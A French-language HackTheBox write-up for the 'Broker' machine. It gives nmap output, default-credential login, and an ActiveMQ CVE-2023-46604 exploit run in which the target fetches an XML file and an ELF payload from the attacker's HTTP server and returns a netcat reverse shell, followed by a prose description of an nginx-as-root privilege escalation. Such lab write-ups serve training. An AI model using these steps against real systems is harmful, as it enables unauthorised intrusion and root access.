---
title: HTB | Broker
description: Broker is an easy difficulty Linux machine hosting a version of Apache ActiveMQ. Enumerating the version of Apache ActiveMQ shows that it is vulnerable to Unauthenticated Remote Code Execution, which is leveraged to gain user access on the target. Post-exploitation enumeration reveals that the system has a sudo misconfiguration allowing the activemq user to execute sudo /usr/sbin/nginx, which is similar to the recent Zimbra disclosure and is leveraged to gain root access.
slug: broker-htb
date: 2024-12-13 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Broker cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Broker</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.11.243</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Enumeration

### nmap

```bash
nmap -sC -sV -An -p- 10.10.11.243
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
1883/tcp  open  mqtt
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     ActiveMQ/Advisory/Consumer/Topic/#: 
|_    ActiveMQ/Advisory/MasterBroker: 
5672/tcp  open  amqp?
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
8161/tcp  open  http       Jetty 9.4.39.v20210325
|_http-title: Error 401 Unauthorized
|_http-server-header: Jetty(9.4.39.v20210325)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
44151/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       Jetty 9.4.39.v20210325
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title.
|_http-server-header: Jetty(9.4.39.v20210325)
61616/tcp open  apachemq   ActiveMQ OpenWire transport
| fingerprint-strings: 
|   NULL: 
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName 
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails 
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion 
|_    5.15.15                                                           
```

## Foothold

### Apache ActiveMQ Server (CVE-2023-46604)
On utilise le login admin/admin pour se connecter :
Sur la page principale, on remarque le numero de verion : Apache ActiveMQ 5.15.15

Après une petite recherche sur internet on trouve rapidement une CVE avec un repo github permettant de l'exploiter :
https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ?tab=readme-ov-file

```bash
./exploit -i 10.10.11.243 -u http://10.10.16.10:8001/poc-linux.xml
     _        _   _           __  __  ___        ____   ____ _____ 
    / \   ___| |_(_)_   _____|  \/  |/ _ \      |  _ \ / ___| ____|
   / _ \ / __| __| \ \ / / _ \ |\/| | | | |_____| |_) | |   |  _|  
  / ___ \ (__| |_| |\ V /  __/ |  | | |_| |_____|  _ <| |___| |___ 
 /_/   \_\___|\__|_| \_/ \___|_|  |_|\__\_\     |_| \_\\____|_____|

[*] Target: 10.10.11.243:61616
[*] XML URL: http://10.10.16.10:8001/poc-linux.xml

[*] Sending packet: 000000781f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e74657874010025687474703a2f2f31302e31302e31362e31303a383030312f706f632d6c696e75782e786d6c

------------------------------------------------------------------------------

python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
10.10.11.243 - - [12/Dec/2024 00:19:59] "GET /poc-linux.xml HTTP/1.1" 200 -
10.10.11.243 - - [12/Dec/2024 00:19:59] "GET /poc-linux.xml HTTP/1.1" 200 -
10.10.11.243 - - [12/Dec/2024 00:19:59] "GET /test.elf HTTP/1.1" 200 -
10.10.11.243 - - [12/Dec/2024 00:20:15] "GET /poc-linux.xml HTTP/1.1" 200 -
10.10.11.243 - - [12/Dec/2024 00:20:15] "GET /poc-linux.xml HTTP/1.1" 200 -
10.10.11.243 - - [12/Dec/2024 00:20:15] "GET /test.elf HTTP/1.1" 200 -


------------------------------------------------------------------------------

$ nc -lnvp 8888
...
activemq@broker:/opt/apache-activemq-5.15.15/bin$ cat ~/user.tdxt
cat: /home/activemq/user.tdxt: No such file or directory
activemq@broker:/opt/apache-activemq-5.15.15/bin$ cat ~/user.txt
9e54.....9a86
activemq@broker:/opt/apache-activemq-5.15.15/bin$ 
```

## Privilege Escalation

### nginx as root
En faisant sudo -l, on observe que l'on peut executer la commande `nginx` en tant que root. Avec cette commande, on peut relancer un deuxieme serveur nginx sur un autre
port en lui passant un nouveau fichier de configuration. La méthode, consiste donc à modifier l'utilisateur dans le fichier de configuration pour que l'interaction
avec les fichiers se fassent en tant que root.

Si on se connecte en HTTP à l'ip du serveur avec le port défini dans la configuration nous allons pouvoir ouvrir tous les fichiers de l'ordinateur, et donc notamment
le fichier `root.txt` contenant le flag.
```bash
......................
```